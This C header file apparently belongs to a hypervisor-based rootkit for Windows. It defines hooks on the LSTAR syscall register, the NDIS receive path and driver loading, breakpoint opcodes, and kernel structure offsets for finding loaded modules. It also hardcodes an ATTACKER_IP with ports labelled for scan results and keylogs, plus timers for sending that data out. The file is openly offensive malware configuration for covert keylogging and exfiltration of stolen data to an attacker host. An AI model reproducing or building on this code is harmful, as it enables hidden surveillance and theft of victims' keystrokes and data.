#ifndef __HOOKING_H
#define __HOOKING_H

#include <lib/types.h>
#include <vmm/vmm.h>

#define LSTAR_MSR 0xC0000082

#define NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET 0x4993   // actually at 0x4990, but "push r12" is a bit later


#define PUSH_RBP 0x55
#define PUSH_R12 0x5441
#define INT3_OPCODE 0xcc
#define INT3 0x3

extern void handle_lstar_write(uint64_t lstar);
extern void handle_MiDriverLoadSucceeded_hook(vmexit_data_t *state);

#define KLDR_DATA_TABLE_ENTRY_Flink(x) (x)
#define KLDR_DATA_TABLE_ENTRY_Blink(x) ((x)+8)
#define KLDR_DATA_TABLE_ENTRY_DllBase(x) ((x)+0x30)
#define KLDR_DATA_TABLE_ENTRY_BaseDllName(x) ((x)+0x58)

#define UNICODE_STRING_Length(x) (x)
#define UNICODE_STRING_Buffer(x) ((x)+8)

#define ATTACKER_IP 0xac1cb73f  // 172.28.183.63
#define SRC_PORT 49321
#define DST_SCAN_PORT 49323
#define DST_KEYLOGS_PORT 49325

#define SEND_TIMER_TIME 0x2ffffff
#define IMMEDIATE_SENDING TRUE

extern qword_t find_windows_module(wchar_t *name, uint16_t len);
extern uint64_t guest_virtual_to_physical(uint64_t addr);

#endif